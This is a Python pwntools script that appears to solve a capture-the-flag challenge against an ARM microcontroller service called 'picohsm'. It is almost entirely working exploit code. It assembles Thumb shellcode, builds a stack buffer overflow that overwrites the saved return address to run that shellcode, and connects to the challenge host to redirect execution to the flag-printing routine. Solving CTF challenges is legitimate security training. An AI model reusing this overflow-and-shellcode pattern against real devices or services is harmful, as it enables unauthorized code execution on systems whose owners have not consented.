#! env python3

from pwn import *
from keystone import *

sp = 0x20001fd8 # value of sp when entering/exiting handle_client recovered via unicorn

shellcode_txt = """
# r0 = sp
mov r0, #0x{socket_addr_lsb:x};
movt r0, #0x{socket_addr_msb:x};

# r1 = 0x20000010 (w5500)
mov r1, #0x0010;
movt r1, #0x2000;

# r2 = 0
mov r2, #0;

# r3 = 0x08000caf (socket_t::socket_t)
mov r3, #0x0caf;
movt r3, #0x0800;

# call socket_t::socket_t
blx r3;

# set up socket_t object in r4
mov r4, r0;

# r3 = 0x0800040b (right before printing the flag)
mov r3, #0x040b;
movt r3, #0x0800;

# gogogo
blx r3
""".format(socket_addr_lsb=sp & 0xffff,
           socket_addr_msb=((sp & 0xffff0000) >> 16))

sc_addr = sp # start with the sp value
sc_addr -= 0x304 # start of the stack buffer
sc_addr += 8 * 2 # the b'a ' part of the payload
sc_addr -= 4 # because of how sp points to used memory
sc_addr += 1 # thumb

ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)
shellcode_bin, _ = ks.asm(shellcode_txt, addr=sc_addr)

io = remote('picohsm.donjon-ctf.io', 8006)

for i in range(3):
    print(io.recvline())

payload = b'a ' * 8
payload += bytes(shellcode_bin)
payload += b'a' * (0x304 - 2 * 8 - len(shellcode_bin))
payload += p32(sc_addr) # overwrite saved lr

io.send(payload)

for i in range(5):
    print(io.recvline())
